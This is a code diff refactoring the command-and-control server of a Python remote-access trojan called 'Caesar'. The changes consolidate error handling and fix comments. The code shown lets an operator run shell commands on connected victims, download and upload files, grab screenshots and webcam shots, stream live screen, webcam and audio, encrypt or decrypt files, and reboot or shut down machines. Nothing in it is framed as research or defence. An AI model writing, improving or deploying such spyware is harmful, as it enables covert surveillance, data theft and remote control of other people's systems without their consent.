@@ -37,14 +37,14 @@ class Caesar:
                 print(f"[-]Error unable to create socket {str(err)}")
 
 
-        # handles incoming connections
+        # handle incoming connections
         def handle_connections(self):
             while True:
 
                 try:
                     conn, addr = self.sock.accept()
                     conn.setblocking(True)
-                    client_info = conn.recv(1024).decode()# recieves client system information
+                    client_info = conn.recv(1024).decode()# receive client system information
                     ip = re.findall("'(.*?)'", str(addr))# extract ip from addr
                     ip = "".join(ip)
 
@@ -78,7 +78,7 @@ class Caesar:
                     break
 
 
-        # displays caesar shell commands
+        # display caesar shell commands
         def show_commands(self):
             user_guide = """
                 Caesar Commands
@@ -118,7 +118,7 @@ class Caesar:
             return f"{BOLD}{COLOR}{text}{RESET}"
 
 
-        # returns socket connection object 
+        # return socket connection object 
         def get_socket_obj(self, client_id):
             try:
                 for clients, socket_obj in self.socket_object_dict.items():
@@ -130,7 +130,7 @@ class Caesar:
 
 
 
-        # sends null to the client and get the current working directory in return
+        # send null to the client and get the current working directory in return
         def send_null(self, client_sock_object):
                 client_sock_object.send(str(" ").encode())
                 data = client_sock_object.recv(1024).decode()
@@ -138,156 +138,118 @@ class Caesar:
 
 
 
-        # sends commands to the client
+        # send commands to the client
         def handle_client_session(self, client_id, client_sock_object):
                 self.send_null(client_sock_object)
                 self.current_session_id = client_id
 
 
                 while True:
-                    cmd = ""
-                    cmd = input()
-                    cmd = cmd.rstrip()
+                    try:
+                        cmd = ""
+                        cmd = input()
+                        cmd = cmd.rstrip()
 
-                    if cmd.strip()== 'quit':
-                        print("[+]Closing Session!!!!....")
-                        self.current_session_id = ""
-                        break
+                        if cmd.strip()== 'quit':
+                            print("[+]Closing Session!!!!....")
+                            self.current_session_id = ""
+                            break
 
-                    elif cmd == "":
-                        self.send_null(client_sock_object)
+                        elif cmd == "":
+                            self.send_null(client_sock_object)
 
-                    elif cmd == "guide":
-                        self.show_commands()
-                        self.send_null(client_sock_object)
+                        elif cmd == "guide":
+                            self.show_commands()
+                            self.send_null(client_sock_object)
 
-                    elif "get" in cmd:
-                        try:
+                        elif cmd.startswith("get "):
                             client_sock_object.send(str(cmd).encode())
-                            usrFile = client_sock_object.recv(1024).decode()
+                            usrFile = cmd.split()[-1]
                             data = client_sock_object.recv(1024).decode()
                             if "File does not exist!!!" not in data:
                                 self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
                                 print(str(data), end="")
                             else:
                                 print(data)
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
 
-                    elif "send" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            self.clientHandler.send_file(client_sock_object, cmd[5:])
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
-                    elif cmd.strip() == "camshot":
-                        try:
+                        elif cmd.startswith("send "):
+                            filepath = str(cmd.split()[-1])
+
+                            if os.path.isabs(filepath):
+                                client_sock_object.send(str(cmd).encode())
+                                self.clientHandler.send_file(client_sock_object, filepath)
+                                data = client_sock_object.recv(1024).decode()
+                                print(str(data), end="")
+                            else:
+                                print("[-]You must provide an absolue path for the file you want to send!")
+                                self.send_null(client_sock_object)
+
+                        elif cmd.strip() == "camshot":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif cmd.strip() == "camfeed":
-                        try:
+
+                        elif cmd.strip() == "camfeed":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             self.clientHandler.live_webcam_feed(client_sock_object)
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif cmd.strip() == "screenshot":
-                        try:
+
+                        elif cmd.strip() == "screenshot":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                             print(str(data), end="")
-                        except Exception as e:
-                            print(e)
-                            print("[-]Connection terminated!!!")
-                            break
-                    elif cmd.strip() == "screenfeed":
-                        try:
+
+                        elif cmd.strip() == "screenfeed":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             self.clientHandler.live_screen_feed(client_sock_object)
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif cmd.strip() == "audiofeed":
-                        try:
+
+                        elif cmd.strip() == "audiofeed":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif "encrypt" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif "decrypt" in cmd:
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
 
-                    elif cmd.strip() == "reboot":
-                        try:
+                        elif cmd.startswith("encrypt "):
+                            client_sock_object.send(str(cmd).encode())
+                            data = client_sock_object.recv(1024).decode()
+                            print(str(data), end="")
+
+                        elif cmd.startswith("decrypt "):
+                            client_sock_object.send(str(cmd).encode())
+                            data = client_sock_object.recv(1024).decode()
+                            print(str(data), end="")
+
+                        elif cmd.strip() == "reboot":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif cmd.strip() == "shutdown":
-                        try:
+
+                        elif cmd.strip() == "shutdown":
                             cmd = cmd.strip()
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(1024).decode()
                             print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    else:
-                        try:
+                            
+                        else:
                             client_sock_object.send(str(cmd).encode())
                             data = client_sock_object.recv(65536).decode()
                             print(str(data), end="")
-                        except:
-                            print("[-]Connection terminated!!!")
-                            break
+
+                    except Exception as e:
+                        print("[-]Connection terminated!!!")
+                        print(e)
+                        break
 
 
 
